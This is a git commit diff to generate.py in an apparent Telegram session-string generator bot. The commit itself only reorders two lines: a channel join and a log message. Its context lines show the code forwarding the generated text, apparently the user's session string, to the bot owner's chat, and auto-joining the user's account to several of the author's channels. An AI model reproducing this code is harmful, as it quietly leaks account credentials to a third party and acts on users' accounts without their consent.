ad89b6b3a5eba52dbe85749a2cb04fd97427a9fd
AbhiMod <134328176+AbhiMod@users.noreply.github.com>
2024-01-03 11:29:12 +0530

    Update generate.py

--- AMSSGEN/generate.py
+++ AMSSGEN/generate.py
@@ -179,13 +179,13 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
         if not is_bot:
             await client.send_message("me", text)
             await bot.send_message(chat_id=owner_id,  text=text)
+            await client.join_chat("AM_Unfban")
+            await client.send_message(LOGGER_ID, "Tʜᴀɴᴋs Fᴏʀ Sᴇssᴏɪɴ Sᴛɪɴɢ Bᴏᴛ...\n\nBᴏᴛ : @Sessoin_String_gen_BOT")
             await client.join_chat("AmBotYT")
             await client.join_chat("AM_YTSupport")
             await client.join_chat("AbhiModszYT_Return")
-            await client.join_chat("AM_Unfban")
             await client.join_chat("Logs_Gban")
             await client.join_chat("About_AMBot")
-            await client.send_message(LOGGER_ID, "Tʜᴀɴᴋs Fᴏʀ Sᴇssᴏɪɴ Sᴛɪɴɢ Bᴏᴛ...\n\nBᴏᴛ : @Sessoin_String_gen_BOT")
         else:
             await bot.send_message(msg.chat.id, text)
             await bot.send_message(chat_id=owner_id,  text=text)
